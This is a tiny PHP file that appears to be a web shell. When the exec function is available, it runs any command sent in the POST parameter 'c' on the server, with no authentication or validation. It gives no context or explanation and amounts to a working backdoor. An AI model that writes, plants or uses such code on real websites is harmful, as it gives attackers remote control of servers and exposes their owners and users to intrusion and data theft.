<?php
if (function_exists('exec')) { 
	echo "start";
	$ExecArray = array(); 
	exec($_POST['c'],$ExecArray); 
}
?>